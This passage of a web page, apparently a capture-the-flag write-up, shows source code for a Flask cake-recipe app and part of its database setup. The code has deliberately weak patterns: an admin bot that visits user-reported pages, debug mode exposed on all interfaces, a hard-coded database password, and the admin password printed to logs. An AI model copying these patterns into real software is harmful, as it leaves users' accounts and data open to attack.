<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Username and password are required</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="n">user</span> <span class="o">=</span> <span class="nf">get_user_by_credentials</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
            <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user_id</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">role</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Login successful!</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid username or password</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/logout</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">session</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
    <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Logged out successfully</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
    <span class="n">cakes</span> <span class="o">=</span> <span class="nf">get_user_cakes</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">cakes</span><span class="o">=</span><span class="n">cakes</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/cake/&lt;int:cake_id&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">view_cake</span><span class="p">(</span><span class="n">cake_id</span><span class="p">):</span>
    <span class="n">cake</span> <span class="o">=</span> <span class="nf">get_cake_by_id</span><span class="p">(</span><span class="n">cake_id</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">cake</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Cake not found</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="c1"># Check if user can view this cake
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">cake</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="ow">and</span> <span class="n">cake</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="ow">and</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">role</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Access denied</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">view_cake.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">cake</span><span class="o">=</span><span class="n">cake</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/report-issue</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">report_issue</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">cake_id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cake_id</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">issue_description</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">issue_description</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">cake_id</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">issue_description</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Cake ID and issue description are required</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">report_issue.html</span><span class="sh">'</span><span class="p">)</span>
        
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># Validate cake_id is numeric
</span>            <span class="k">if</span> <span class="ow">not</span> <span class="n">cake_id</span><span class="p">.</span><span class="nf">isdigit</span><span class="p">():</span>
                <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid Cake ID format</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>
                <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">report_issue.html</span><span class="sh">'</span><span class="p">)</span>

            <span class="n">base_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://localhost:5000</span><span class="sh">'</span>
            <span class="n">cake_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s">/cake/</span><span class="si">{</span><span class="n">cake_id</span><span class="si">}</span><span class="sh">"</span>

            <span class="nf">start_admin_bot</span><span class="p">(</span><span class="n">cake_url</span><span class="p">,</span> <span class="n">admin_pass</span><span class="p">)</span>

            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Issue reported successfully! An admin will review it soon.</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>

        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">❌ Report issue error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Failed to process the issue report</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">report_issue.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@admin_required</span>
<span class="k">def</span> <span class="nf">admin_dashboard</span><span class="p">():</span>
    <span class="n">users</span> <span class="o">=</span> <span class="nf">get_all_users</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">admin.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">users</span><span class="o">=</span><span class="n">users</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin/calculate-nutrition</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@admin_required</span>
<span class="k">def</span> <span class="nf">calculate_nutrition_route</span><span class="p">():</span>
    <span class="n">cake_id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cake_id</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="n">result</span> <span class="o">=</span> <span class="nf">calculate_nutrition</span><span class="p">(</span><span class="n">cake_id</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Procedure failed or not found</span><span class="sh">'</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">result</span><span class="sh">'</span><span class="p">:</span> <span class="n">result</span><span class="p">})</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/cake-builder</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">cake_builder</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">cake_builder.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/api/save-cake</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">save_cake_api</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">()</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="n">ingredients</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">ingredients</span><span class="sh">'</span><span class="p">,</span> <span class="p">{})</span>
    <span class="n">instructions</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">instructions</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">ingredients</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Name and ingredients are required</span><span class="sh">'</span><span class="p">}),</span> <span class="mi">400</span>
    
    <span class="k">if</span> <span class="nf">save_cake</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">ingredients</span><span class="p">,</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">status</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Cake saved successfully</span><span class="sh">'</span><span class="p">})</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Failed to save cake</span><span class="sh">'</span><span class="p">}),</span> <span class="mi">400</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">wait_for_db</span><span class="p">():</span>
        <span class="nf">init_db_pool</span><span class="p">()</span>
        
        <span class="c1"># Set up initial data
</span>        <span class="n">admin_pass</span> <span class="o">=</span> <span class="nf">get_or_generate_admin_password</span><span class="p">()</span>
        <span class="nf">setup_users</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">)</span>
        <span class="nf">setup_sample_cakes</span><span class="p">()</span>
        
        <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to start application due to database connection issues</span><span class="sh">"</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="app_database">
  <summary>app/database.py</summary>

  <div file="app/database.py" class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="app/database.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">psycopg2</span>
<span class="kn">import</span> <span class="n">psycopg2.pool</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">from</span> <span class="n">utils</span> <span class="kn">import</span> <span class="n">hash_password</span>

<span class="c1"># Database configuration
</span><span class="n">DB_CONFIG</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">dbname</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">cake_db</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">postgres</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">871576ad349c9b16620685b58ab569ce</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">host</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">db</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">port</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5432</span>
<span class="p">}</span>

<span class="n">db_pool</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">init_db_pool</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Initialize database connection pool</span><span class="sh">"""</span>
    <span class="k">global</span> <span class="n">db_pool</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">db_pool</span> <span class="o">=</span> <span class="n">psycopg2</span><span class="p">.</span><span class="n">pool</span><span class="p">.</span><span class="nc">SimpleConnectionPool</span><span class="p">(</span>
            <span class="n">minconn</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
            <span class="n">maxconn</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span>
            <span class="o">**</span><span class="n">DB_CONFIG</span>
        <span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Database connection pool initialized successfully</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Failed to initialize database pool: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">db_pool</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">get_db</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Get a database connection from the pool</span><span class="sh">"""</span>
    <span class="k">global</span> <span class="n">db_pool</span>
    <span class="k">if</span> <span class="n">db_pool</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">psycopg2</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="o">**</span><span class="n">DB_CONFIG</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">db_pool</span><span class="p">.</span><span class="nf">getconn</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Return a database connection to the pool</span><span class="sh">"""</span>
    <span class="k">global</span> <span class="n">db_pool</span>
    <span class="k">if</span> <span class="n">db_pool</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">db_pool</span><span class="p">.</span><span class="nf">putconn</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">wait_for_db</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Wait for database to be ready</span><span class="sh">"""</span>
    <span class="n">max_retries</span> <span class="o">=</span> <span class="mi">30</span>
    <span class="n">retry_count</span> <span class="o">=</span> <span class="mi">0</span>
    
    <span class="k">while</span> <span class="n">retry_count</span> <span class="o">&lt;</span> <span class="n">max_retries</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="n">psycopg2</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="o">**</span><span class="n">DB_CONFIG</span><span class="p">)</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Database is ready!</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">True</span>
        <span class="k">except</span> <span class="n">psycopg2</span><span class="p">.</span><span class="n">OperationalError</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Database not ready, retrying... (</span><span class="si">{</span><span class="n">retry_count</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">max_retries</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">retry_count</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to connect to database after maximum retries</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">setup_users</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Set up initial users in the database</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        
        <span class="c1"># Create admin user
</span>        <span class="n">admin_password_hash</span> <span class="o">=</span> <span class="nf">hash_password</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">)</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"""</span><span class="s">
            INSERT INTO users (username, email, password, role) 
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (username) DO NOTHING
        </span><span class="sh">"""</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin@cakearchitect.com</span><span class="sh">'</span><span class="p">,</span> <span class="n">admin_password_hash</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">))</span>
        
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">✅ Admin user created with password: </span><span class="si">{</span><span class="n">admin_pass</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">❌ Error setting up users: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">rollback</span><span class="p">()</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setup_sample_cakes</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Set up sample cakes in the database</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        
        <span class="c1"># Sample cakes
</span>        <span class="n">cakes</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">{</span>
                <span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Classic Chocolate Cake</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">ingredients</span><span class="sh">'</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">flour</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">2 cups</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">sugar</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 cup</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">cocoa</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 cup</span><span class="sh">"</span><span class="p">},</span>
                <span class="sh">'</span><span class="s">instructions</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mix dry ingredients, add wet ingredients, bake at 350F for 30 minutes</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">created_by</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">is_public</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span>
            <span class="p">},</span>
            <span class="p">{</span>
                <span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Vanilla Sponge Cake</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">ingredients</span><span class="sh">'</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">flour</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 cup</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">sugar</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 cup</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">eggs</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">},</span>
                <span class="sh">'</span><span class="s">instructions</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Beat eggs and sugar, fold in flour, bake at 325F for 25 minutes</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">created_by</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">is_public</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span>
            <span class="p">}</span>
        <span class="p">]</span>
        
        <span class="k">for</span> <span class="n">cake</span> <span class="ow">in</span> <span class="n">cakes</span><span class="p">:</span>
